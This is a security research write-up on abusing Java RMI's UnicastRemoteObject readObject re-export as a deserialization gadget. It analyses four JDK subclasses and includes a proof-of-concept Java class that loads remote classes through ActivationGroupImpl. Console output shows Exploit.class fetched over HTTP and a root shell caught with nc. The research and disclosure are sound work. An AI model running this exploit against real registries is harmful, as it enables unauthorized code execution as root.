### The UnicastRemoteObject class

----

The ``UnicastRemoteObject`` is one of the backbones of *Java RMI* and is interesting for several reasons.
The reason why it drew my attention was it's very interesting ``readObject`` method.

```java
/**
 * Re-export the remote object when it is deserialized.
 *
 * @param  in the {@code ObjectInputStream} from which data is read
 * @throws IOException if an I/O error occurs
 * @throws ClassNotFoundException if a serialized class cannot be loaded
 *
 */
@java.io.Serial
private void readObject(java.io.ObjectInputStream in)
    throws java.io.IOException, java.lang.ClassNotFoundException
{
    in.defaultReadObject();
    reexport();
}
```

The code shown above basically means that each deserialization of a ``UnicastRemoteObject`` leads to
a call to ``reexport``. Exporting in the terms of *RMI* means, that the object is registered to the
*RMI runtime* and made available on a *TCP* port. This means, that ``UnicastRemoteObject`` can be used
as a deserialization gadget, that creates a *RMI* listener on the server side.

Sounds good, right? But there are basically two problems:

  1. To make an successful *RMI call*, you need the ``ObjID`` of the corresponding *RemoteObject*.
     When not assigned manually, the ``ObjID`` of a *RemoteObject* is a randomly assigned
     number of the type *Long*. In our case, it is indeed randomly created, as ``reexport``
     just calls the ``export`` method, which uses the following code to create a
     ``UnicastServerRef``:
     ```java
     public static Remote exportObject(Remote obj, int port)
         throws RemoteException
     {
         return exportObject(obj, new UnicastServerRef(port));
     }
     ```
     Within this constructor of ``UnicastServerRef`` the ``ObjID`` is assigned randomly during
     the creation of a ``LiveRef``. Summarized: Even if the server exports the ``UnicastRemoteObject``
     we are not able to call it without bruteforcing the ``ObjID``.

  2. There needs to be a useful implementation of ``UnicastRemoteObject`` on the server side.
     The server obviously needs to be aware of the class of the *RemoteObject* you want to export
     on the server side.


### Solving the ObjID Problem

----

A workaround for the first object could probably be the *RMI registry*. When using the ``bind`` method
from the *RMI registry*, you send a *serialized RemoteObject* and a desired *boundName* to the *RMI
registry* and it will create a mapping between the *boundName* and the *deserialized RemoteObject*.
Normally, *RMI* uses the ``replaceObject`` method from ``ObjectOutputStream`` to replace *RemoteObjects*
send during the call with a corresponding *Proxy instance*, which prevents the *reexport* on the server
side. However, one can prevent this and also send a real *RemoteObject* that will be reexported during
the deserialization. As the resulting deserialized *RemoteObject* is bound to the *RMI registry*, it can
be looked up and it is possible to obtain it's ``ObjID``.

However, with this approach we have two new restrictions:

  1. The *RMI registry* allows bind operations only from localhost.
  2. The *RMI registry* uses deserialization filters per default.

The first issue has only limited impact, as an exploit could still work from localhost and probably also
from remote when exploiting *CVE-2019-2684*, but the second issue is quite big. As mentioned above,
the *RMI registry* normally uses *Proxy instances* (or *stub* classes in legacy cases) when binding *RemoteObjects*.
This means, that the *registry* only needs to deserialize the *Proxy*, an *Interface* (usually extending *Remote*)
and a *Invocation Handler*. This is all explicitly allowed by the deserialization filters, but it is usually
not sufficient for deserialization of a complete *UnicastRemoteObject*.

Summarized, the attack vector described in this document is probably only useful from localhost when attacking
a *RMI server* that has *JEP290* (*deserialization filters*) not already applied.


### Interisting UnicastRemoteObjects

----

The first candidate for a *UnicastRemoteObject* that could potentially be abused, I instantly thought about
*JMX*. However, *JMX* uses a slightly customized *RMI implementation* and the *JMX* server is not build based on
``UnicastRemoteObject``. Therefore, let's just perform a *grep* over the complete *Java* codebase to see
which classes actually are based on *UnicastRemoteObject*:

```console
[qtc@kali src]$ grep --exclude "UnicastRemoteObject.java" -R "extends UnicastRemoteObject" * | egrep -v "^test"
java.rmi/share/classes/java/rmi/activation/ActivationGroup.java:        extends UnicastRemoteObject
java.rmi/share/classes/sun/rmi/server/Activation.java:    class ActivationMonitorImpl extends UnicastRemoteObject
jdk.hotspot.agent/share/classes/sun/jvm/hotspot/debugger/remote/RemoteDebuggerServer.java:public class RemoteDebuggerServer extends UnicastRemoteObject
jdk.naming.rmi/share/classes/com/sun/jndi/rmi/registry/ReferenceWrapper.java:        extends UnicastRemoteObject
```

Only four classes extends *UnicastRemoteObject* within the *Java* codebase. This does not sound very promising,
but let's see what we can do with them:


#### ReferenceWrapper

The ``ReferenceWrapper`` class is so short that we can actually look at it's whole definition here:

```java
public class ReferenceWrapper
        extends UnicastRemoteObject
        implements RemoteReference
{
    protected Reference wrappee;        // reference being wrapped

    public ReferenceWrapper(Reference wrappee)
            throws NamingException, RemoteException
    {
        this.wrappee = wrappee;
    }

    public Reference getReference() throws RemoteException {
        return wrappee;
    }

    private static final long serialVersionUID = 6078186197417641456L;
}
```

The positive thing about this class is, that it is really simple and we can use this to bypass the *deserialization* filters
of the *RMI registry*. By just using a ``null`` value of the class variable ``Reference``, it is possible to send this object to
the *registry* where it is exported during the *deserialization*. However, the class only exposes one remote method (``getReference``)
which does not perform anything useful from an offensive perspective.

As we will see later, even boring *remote methods* can be interesting, as they may allow arbitrary deserialization attacks.
By using the ``UnicastRemoteObject``, we could bypass the deserialization filter of the registry and then communicate
to the ``RemoteObject`` directly, which does not have deserialization filters in place. However, also this vector does not apply
here, as the only exposed *remote method* does not except any arguments.


#### RemoteDebuggerServer

The name of the class ``RemoteDebuggerServer`` sounds already juicy and indeed it is an interesting class. The following excerpt
shows the most relevant part of the class code:

```java
public class RemoteDebuggerServer extends UnicastRemoteObject
  implements RemoteDebugger {

  private transient Debugger debugger;

  public RemoteDebuggerServer() throws RemoteException {
    super();
  }

  public RemoteDebuggerServer(Debugger debugger, int port) throws RemoteException {
    super(port);
    this.debugger = debugger;
  }

  [...]

  public String consoleExecuteCommand(String cmd) throws RemoteException {
    return debugger.consoleExecuteCommand(cmd);
  }
```

As one can see, the class simply extends ``UnicastRemoteObject`` and defines a single *transient* class variable.
This let's it again bypass *deserialization filters* applied by the registry. Furthermore, it exposes several
interesting remote methods, where the most interesting one is probably ``consoleExecuteComand``.

However, there are two reasons why this class is not that suitable for offensive purposes:

1. It is contained within the ``sun.jvm.hotspot`` package, that is not loaded by default.
   Therefore, you cannot count on this object being available on each registry endpoint.
2. All methods rely on the ``Debugger`` set in the *debugger* property. This property can only
   be set during the construction of the ``RemoteDebuggerServer`` and is not accessible for us.
   Therefore, within our exported instance, the value of *debugger* is always ``null`` and most
   methods just return a ``NullPointerException``.

Nonetheless, there is at least one thing you can do with this class: Bypass *deserialization filters* of the
registry. Once the ``RemoteDebuggerServer`` was exported by the registry, you can call the ``consoleExecuteCommand``
method with a serialization gadget as argument. As the ``ObjectInputStream`` of the new generated
``RemoteDebuggerServer`` is unfiltered, this should lead to arbitrary deserialization on *RMI* servers
that use ``readObject`` to unmarshall the ``String`` type. Unfortunately, the ``RemoteDebuggerServer`` class
does not expose any method that accepts a non primitive argument except of ``String``


#### ActivationMonitorImpl

The ``ActivationMonitorImpl`` class is a private class instance defined within ``sun/rmi/server/Activation.java``.
The following excerpt is sufficient to get a rough overview of this class:

```java
class ActivationMonitorImpl extends UnicastRemoteObject
    implements ActivationMonitor
{
    private static final long serialVersionUID = -6214940464757948867L;

    ActivationMonitorImpl(int port, RMIServerSocketFactory ssf)
        throws RemoteException
    {
        super(port, null, ssf);
    }

    public void activeObject(ActivationID id,
                             MarshalledObject<? extends Remote> mobj)
        throws UnknownObjectException, RemoteException
    {
        try {
            checkShutdown();
        } catch (ActivationException e) {
            return;
        }
        RegistryImpl.checkAccess("ActivationSystem.activeObject");
        getGroupEntry(id).activeObject(id, mobj);
    }

    [...]
```

The good news is again, that it is that simple that it can be used to bypass *deserialization filters* of the
*RMI registry*. However, apart from that it is not really that interesting. All exposed methods rely on the
existence of a specific ``ActivationID``, which is never in place for our case. Therefore, the only thing
you can do, is to use the new exported *RemoteObject* for arbitrary deserialization attacks as described above.

However, there is another downside of this class. Reflective access to ``sun`` packages is restricted by the
JVM and *deserialization* of ``ActivationMonitorImpl`` leads to an ``AccessControlException`` when used on the
*registry* (as the *registry* uses a ``SecurityManager`` by default). Therefore, you can only use this *gadget*
when a custom security policy was applied, which is pretty unlikely.


#### ActivationGroup (ActivationGroupImpl)

The ``ActivationGroup`` class is the last in our list and is actually an abstract class. Therefore, we need to
look at it's implementation, which is ``ActivationGroupImpl``. This class is defined again in a ``sun`` package,
which applies the same restrictions as mentioned before. Therefore, it can not be deserialized without a security
manager.

The class definition itself is rather complicated compared to the previous one. This makes it difficult to use this
class for *deserialization* on the registry, as it contains many class variables that are rejected by the *deserialization filters*.
It cloud be possible to null all corresponding values to circumvent this, but I did not tried it, as the only benefit
are again arbitrary *deserialization attacks*, which can already be achieved with the previous mentioned class.

The ``ActivationGroupImpl`` however supports now one *remote method* that is kind of interesting, as it allows remote class loading
attacks, even when ``useCodebaseOnly`` is set to ``true``. However, as this requires a full working ``ActivationGroupImpl`` on
the server side, it can only be used on *RMI servers* that have *JEP290* not installed, which makes it kind of useless again.
However, we will discuss it anyway :D

```java
public MarshalledObject<? extends Remote>
                                  newInstance(final ActivationID id,
                                              final ActivationDesc desc)
    throws ActivationException, RemoteException
{
    RegistryImpl.checkAccess("ActivationInstantiator.newInstance");

    if (!groupID.equals(desc.getGroupID()))
        throw new ActivationException("newInstance in wrong group");

    try {
        acquireLock(id);
        synchronized (this) {
            if (groupInactive == true)
                throw new InactiveGroupException("group is inactive");
        }

        ActiveEntry entry = active.get(id);
        if (entry != null)
            return entry.mobj;

        String className = desc.getClassName();

        final Class<? extends Remote> cl =
            RMIClassLoader.loadClass(desc.getLocation(), className)
            .asSubclass(Remote.class);
        [...]
```

Above you can see the code of the ``newInstance`` method that is exposed by the ``ActivationGroupImpl`` class. In it's first few
lines, it checks whether the caller accesses the object from *localhost* and makes sure that certain parameters of the provided
``ActivationDesc`` object match the once that are contained within the object itself. If both checks pass, the execution flow
goes down to ``RMIClassLoader.loadClass`` which is called with the location and class name specified within the provided ``ActivationDesc``.
Therefore, an attacker could use this *remote method* to load classes from a remote location, even if ``useCodebaseOnly`` is
set to ``true``.

Loading classes with ``RMIClassLoader.loadClass`` still requires a ``SecurityManager`` to be present, that allows accessing the remote
codebase. However, as the ``UnicastRemoteObject`` is exported by the *RMI registry*, a ``SecurityManager`` that allows access to
remote locations should always be in place. But as mentioned before, permissions to access ``sun`` packages during deserialization
is not a default configuration and requires a custom security policy.

For demonstration purposes, we can construct the previous case by running a plain ``rmiregistry`` using the following arguments:

```console
[qtc@kali ~]$ cat /tmp/policy 
grant {
    permission java.security.AllPermission "", "";
};
[qtc@kali ~]$ sudo rmiregistry -J'-Djava.security.policy=/tmp/policy' -J'-Dsun.rmi.registry.registryFilter=*'
```

As one can see, we assign all security permissions to the registry, disable the *deserialization* filters (to simulate a pre *JEP290* registry)
and run the registry as *root* to see that the class loading occurs indeed in the context of the *RMI* registry.

Now we can start to construct the required ``UnicastRemoteObject``. Notice, that at some point one of the required classes tries to introduce
a new ``SecurityManager`` on your local system. This is annoying, as it will prevent further actions from being executed. Therefore, you need
to provide a permissive ``SecurityManager`` yourself in advance to prevent this. The following code was written to work with *rmg*, although
it is not made part of it's default codebase yet:

```java
package de.qtc.rmg.operations;

import java.lang.reflect.Constructor;
import java.rmi.Remote;
import java.rmi.activation.ActivationDesc;
import java.rmi.activation.ActivationGroupID;
import java.rmi.activation.ActivationGroup_Stub;
import java.rmi.activation.ActivationID;
import java.rmi.activation.Activator;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.UnicastRemoteObject;
import java.util.Properties;

import de.qtc.rmg.networking.RMIWhisperer;
import sun.rmi.server.Activation;
import sun.rmi.server.ActivationGroupImpl;

@SuppressWarnings("restriction")
public class ActivationSystem {
    
	private RMIWhisperer rmi;
	
	private String boundName = "when-all-stars-align";

	private Class<?> activationClass;
	private Class<?> activatorImplClass;
	private Class<?> activationSystemImplClass;
	
	private Object activation = null;
	private ActivationID activationID = null;
	private Object activationSystemImpl = null;
	private ActivationGroupImpl activationGroup = null;
	private ActivationGroupID activationGroupID = null;

    public ActivationSystem(RMIWhisperer rmiEndpoint) throws Exception
    {
        this.rmi = rmiEndpoint;
        
		Properties props = System.getProperties();
		props.setProperty("java.security.policy", "/tmp/policy");
    }

    private void lookupClasses() throws Exception
    {
    	activationClass = Class.forName("sun.rmi.server.Activation");
    	activatorImplClass = Class.forName("sun.rmi.server.Activation$ActivatorImpl");
    	activationSystemImplClass = Class.forName("sun.rmi.server.Activation$ActivationSystemImpl");
    }
    
    private void prepareActivation() throws Exception
    {
		Constructor<?> constructor = activationClass.getDeclaredConstructor(new Class[] {});
		constructor.setAccessible(true);
		activation = constructor.newInstance();
    }
    
    private void prepareActivationGroup() throws Exception
    {
    	if( activation == null )
    		prepareActivation();
    	
    	Constructor<?> constructor = activationSystemImplClass.getDeclaredConstructor(new Class[] {Activation.class, int.class, RMIServerSocketFactory.class});
		constructor.setAccessible(true);
		
		activationSystemImpl = constructor.newInstance(activation, 4444, null);
		
		activationGroupID = new ActivationGroupID((java.rmi.activation.ActivationSystem)activationSystemImpl);
		activationGroup = new ActivationGroupImpl(activationGroupID, null);
		UnicastRemoteObject.unexportObject(activationGroup, true);
    }
    
    private void prepareActivationID(String codebase, String className) throws Exception
    {
    	if( activation == null )
    		prepareActivation();
    	
    	Constructor<?> constructor = activatorImplClass.getDeclaredConstructor(new Class[] {Activation.class, int.class, RMIServerSocketFactory.class});
		constructor.setAccessible(true);
		
		Object activator = constructor.newInstance(activation, 4445, null);
		UnicastRemoteObject.unexportObject((Remote) activator, true);
		
		activationID = new ActivationID((Activator)activator);
    }
    
    private void prepareObjects(String codebase, String className) throws Exception
    {
    	lookupClasses();
    	prepareActivation();
    	prepareActivationGroup();
    	prepareActivationID(codebase, className);
    }
    
    public void invoke(String codebase, String className, boolean localhostBypass) throws Exception
    {
    	prepareObjects(codebase, className);
    	ActivationDesc activationDesc = new ActivationDesc(activationGroupID, className, codebase, null);

    	RegistryClient registry = new RegistryClient(rmi);
    	registry.bindObject(boundName, null, 0, localhostBypass, activationGroup);

    	ActivationGroup_Stub stub = (ActivationGroup_Stub)rmi.lookup(boundName);
    	stub.newInstance(activationID, activationDesc);
    	
		UnicastRemoteObject.unexportObject((Remote) activationSystemImpl, true);
    }
}
```

The following listing shows an successful execution against a registry running with the above mentioned arguments:

```java
[qtc@kali remote-method-guesser]$ rmg 127.0.0.1 1099 new http://127.0.0.1:8000/ Exploit
[+] Binding name when-all-stars-align
[+] 
[+] 	Encountered no Exception during bind call.
[+] 	Bind operation was probably successful.
[+]
[+] 	RMI object tries to connect to different remote host: 127.0.1.1.
[+] 		Redirecting the connection back to 127.0.0.1... 
[+] 		This is done for all further requests. This message is not shown again. 

[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [11/Feb/2021 07:35:37] "GET /Exploit.class HTTP/1.1" 200 -

[qtc@kali ~]$ nc -vlp 4446
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4446
Ncat: Listening on 0.0.0.0:4446
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:43152.
id
uid=0(root) gid=0(root) groups=0(root)
```

As one can see, in the case then all stars align, you can get code execution using this technique. However,
here are again the three restrictions:

1. The attack needs to be executed from localhost (the localhost bypass (CVE-2019-2684) does not help here).
2. The registry has to accept arbitrary objects during deserialization.
3. The registry needs to run with a security policy which allows access to ``sun`` packages during
   deserialization.


### Conclusion

----

As demonstrated in this document, ``UnicastRemoteObject`` is a very interesting class that can be used to export
``RemoteObjects`` in a different security context, by abusing it's ``readObject`` method. However, the standard
library only provides a few classes that extend ``UnicastRemoteObject`` and non of them can be exploited without
other conditions that need to be fulfilled.

Beside the standard library, no other projects were investigated for possible attack surface. With access to the codebase
of your target, it definitely makes sense to look out for interesting classes that extend ``UnicastRemoteObject``.
Especially classes, that use the random assigned ``ObjID`` of ``UnicastRemoteObject`` as a session variable could be
completely broken by using the above mentioned technique.

Currently, none of the above mentioned ``UnicastRemoteObjects`` is implemented in *rmg*. As the probability of a vulnerable
endpoint is kind of low, this feature is not that that interesting. However, it may be added in future.
